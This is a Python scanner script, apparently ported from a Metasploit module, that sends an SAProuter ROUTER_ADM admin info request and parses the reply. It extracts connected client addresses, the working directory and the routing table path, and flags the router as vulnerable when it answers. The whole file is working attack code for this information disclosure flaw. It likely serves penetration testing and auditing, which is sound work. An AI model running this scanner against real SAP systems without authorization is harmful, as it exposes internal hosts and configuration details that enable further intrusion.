"""
sap_router_info.py – SAProuter admin info request (CVE-equivalent to
Metasploit's auxiliary/scanner/sap/sap_router_info_request).

Sends a ROUTER_ADM info request to an SAProuter and parses the response
to extract connected clients, working directory, routing table path,
and other configuration details.

This is an information disclosure vulnerability: a properly secured
SAProuter should reject admin requests from external hosts.

Reference: https://github.com/rapid7/metasploit-framework/blob/master/
           modules/auxiliary/scanner/sap/sap_router_info_request.rb
"""

import socket
import struct


def saprouter_info_request(host: str, port: int = 3299,
                           timeout: float = 10) -> dict:
    """Send a ROUTER_ADM info request to an SAProuter.

    Args:
        host: SAProuter IP or hostname
        port: SAProuter port (default 3299)
        timeout: Connection timeout

    Returns dict with:
        vulnerable: bool — True if info was returned
        clients: list of dicts — connected client entries
        total_clients: int — total number of connected clients
        working_dir: str — SAProuter working directory
        routtab: str — path to routing table file
        raw_info: list of str — all info lines from the response
        error: str — error message if request failed
    """
    result = {
        "vulnerable": False,
        "clients": [],
        "total_clients": 0,
        "working_dir": "",
        "routtab": "",
        "raw_info": [],
        "error": "",
    }

    # Build ROUTER_ADM info request
    # Format: "ROUTER_ADM" + [0, version=0x26, cmd=2, 0, 0]
    admin_pkt = b"ROUTER_ADM" + struct.pack("bbbbb", 0, 0x26, 2, 0, 0)
    ni_packet = struct.pack("!I", len(admin_pkt)) + admin_pkt

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(timeout)
    try:
        sock.connect((host, port))
        sock.sendall(ni_packet)

        # Read all response frames
        resp = b""
        try:
            while True:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                resp += chunk
                if len(resp) > 100000:
                    break
        except socket.timeout:
            pass
        sock.close()

    except Exception as e:
        result["error"] = str(e)
        return result

    if len(resp) < 4:
        result["error"] = "No response from SAProuter"
        return result

    # Parse multi-frame NI response
    frames = []
    pos = 0
    while pos + 4 <= len(resp):
        flen = struct.unpack("!I", resp[pos:pos + 4])[0]
        if flen == 0:
            pos += 4
            break  # empty frame = end of response
        if pos + 4 + flen > len(resp):
            break
        payload = resp[pos + 4:pos + 4 + flen]
        frames.append(payload)
        pos += 4 + flen

    if not frames:
        result["error"] = "Empty response — admin request denied"
        return result

    # Check for error response
    if frames[0].startswith(b"NI_RTERR") or b"*ERR*" in frames[0]:
        result["error"] = "Admin request denied by SAProuter"
        return result

    # SAProuter responded with info — it's vulnerable
    result["vulnerable"] = True

    # Frame 0: Connection table (binary, fixed-width fields)
    # Header: 4 bytes (length/flags) + 4 bytes (padding) + 1 byte (num clients)
    # Then per entry: 4-byte IP + hostname (null-terminated, padded to ~46 bytes)
    #                 + destination + service fields
    conn_frame = frames[0]
    if len(conn_frame) > 9:
        num_clients = conn_frame[8]
        conn_data = conn_frame[9:]

        # Extract client entries — each starts with 4-byte binary IP then hostname
        i = 0
        while i < len(conn_data) and len(result["clients"]) < max(num_clients, 10):
            # Skip 4-byte binary IP address
            if i + 4 > len(conn_data):
                break
            ip_bytes = conn_data[i:i + 4]
            ip_str = ".".join(str(b) for b in ip_bytes)
            i += 4

            # Hostname: null-terminated string
            hostname_end = conn_data.find(b"\x00", i)
            if hostname_end < 0:
                break
            hostname = conn_data[i:hostname_end].decode("ascii", errors="replace").strip()
            # Skip past the hostname + remaining padding (to ~46 byte boundary)
            i = hostname_end + 1
            # Skip null padding until next non-null or end
            while i < len(conn_data) and conn_data[i] == 0:
                i += 1

            # Use hostname if available, otherwise IP
            src = hostname if hostname else ip_str

            if src:
                result["clients"].append({
                    "source": src,
                    "ip": ip_str,
                })

            # After the source block, remaining bytes are destination/service
            # which may be empty for simple connections — skip to end
            break  # Connection table format varies by router version

    # Remaining frames: text info lines (null-terminated strings)
    for frame in frames[1:]:
        text = frame.decode("ascii", errors="replace").rstrip("\x00").strip()
        if not text:
            continue

        # Strip leading non-printable bytes
        while text and (ord(text[0]) < 32 or ord(text[0]) > 126):
            text = text[1:]

        if not text:
            continue

        result["raw_info"].append(text)

        # Parse known fields
        if text.startswith("Total no. of clients:"):
            try:
                result["total_clients"] = int(text.split(":")[1].strip())
            except (ValueError, IndexError):
                pass
        elif "Working directory" in text and ":" in text:
            result["working_dir"] = text.split(":", 1)[1].strip()
        elif "Routtab" in text and ":" in text:
            result["routtab"] = text.split(":", 1)[1].strip()

    return result
